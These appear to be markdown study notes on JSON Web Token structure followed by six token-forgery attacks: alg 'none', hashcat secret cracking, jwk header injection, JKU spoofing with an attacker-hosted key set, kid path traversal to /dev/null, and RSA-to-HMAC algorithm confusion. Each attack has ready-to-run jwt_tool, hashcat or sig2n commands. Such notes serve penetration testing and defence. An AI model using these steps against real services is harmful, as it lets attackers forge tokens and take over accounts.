# [token.dev](token.dev)

# JWT Format

## JWS Specification

- Used for authentication and authorization

- contain JSON objects 

- Stored client side only

- Contains three parts:
    - Header (JOSE header):
        - "alg" : Thats the algorith used to sign the token
        - type : the  type of token(This is an optional element and if present for a JWT, it is recommended to use JWT as the media type.)
        - "kid":Looking at the kid, the recipient of the message should know where and how to lookup for the key and find it.
    - Payload: contains the claims
    - Signature

- The 3 parts are concatenated with a `.`

- ! Contains no spaces

- All parts are base64 encoded

### some known claims

- "iss" : The issuer of the token
- "azp"|"aud" : Google authorized Parties
- "sub" : Google specific userID
- "at_hash" : The hash of the access token 
- "iat" : Time since epoch the jwt created
- "exp" : Expires in 
- "nonce" : prevents replay attacks




# Attack #1 : Unsecured JWT

`A JWT can be either a JWS or a JWE object. Unsecured JWT is a JWS object where in the JOSE header the value of the "alg" element is set to none`


- Try to change the value of alg to "none"
- You can try then to leave the the old signature or remove it entirely.


# Attack #2 : Bruteforce the secret of the signature

```
$ hashcat -a 0 -m 16500 <jwt> <wordlist>
```


- Fix the signature

```
$ python3 jwt_tool.py "{jwt}" -S {Algorith} -p {secret}
```

# Attack #3 : header jwkey injection

- jwk (JSON Web Key) - Provides an embedded JSON object representing the public key that verify`s the signature

- If a server is not validating the contents of these parameters,or doesn`t compare the embeded key with the real one, it may be possible for an attacker to generate self-signed tokens that would be accepted by the server.

### Common JOSE Header structure 

```

{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}

```

- kid`s have to match each other
- n is the public key 

### Attack chain

`$ python3 jwt_tool "{token}" -X i -T`

- change the payload 

- make sure the 2 'kid' inside jose header match each other (jwt_tool creates keys with its own kid)

- jwt_tool takes care of rsa keys


# Attack #4 : Spoof JKU (JWT Key URL)

JKU allows you to specify a url a server might use to grab 
the key to verify the integrity of jwt

- the kid value in JOSE header can point to the right 
one in case there are more than one

the endpoint hosts a file with the above structure :

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

- This file is called the JSON Web Key Sets (JWKS) and can contain multiple keys.

- a JWK Set is usually serverd in the standard endpoint `/.well-known/jwks.json`

- "n" here represents the public key used to verify the signature of the jwt


### Exploit

`$ python3 jwt_tool "{token}" -X s -ju {exploit_server/keys.json} -T`

- jwt_tool will output the file in your home directory 

- it will also handle the craft of rsa keys

- ! make sure the kid`s in jose header again match as jwt_tool creates keys with its own kid

- host the Set file in your exploit server

- use the new token to exploit the target



# Attack #5 : Nullify kid


Parameter kid might be vulnerable to path traversal

So changing it to something like ../../../../../dev/null
and sign the token again with null password might
do the job


`$ python3 jwt_tool "{token}" -T -S hs256 -p ''`


# Attack #6 : Encryption Algorithm Confusion


In some instances , developers are not taking in consideration that 
the token might be anything else than signed with ,for example , rsa encryption,
even the the application is able to verify tokens signed with other algorithms aswell.

As a result , tokens signed with lets say MAC-SHA256 will still be treated as RSA.

This way we can spoof the encryption algorithm and bypass the verification.

### Step 1. Obtain the public key of the server

Some common endpoints where we might find the public keys are
`/jwks.json` or `/.well-known/jwks.json`

### Step 2 . Normalize the key

The public key needs to be in the exact format that the server is using it to verify the tokens.
Two aspects of this nature are :

- The format of teh key (ex. X.509 PEM)
- The key itself sa raw bytes(even non printable chars)


### Step 3. Modify the Key 

- Change the kid to match if needed
- Change the algorithm to a symmetric encryption algorithm( ex. hs256)

[online tool](https://jwkset.com/inspect)

### Step 4. Sign the token

- The secret is now the public key


`$ python3 jwt_tool.py "{token}" -X k -pk key.pem -I -pc {claim name} -pv {claim value}`



### Bruteforce the public key

you can derive the public key from two tokens signed from the server

`$ docker run --rm -it portswigger/sig2n <token1> <token2> `


- the output of the command has pairs of public keys and tokens which are not all valid


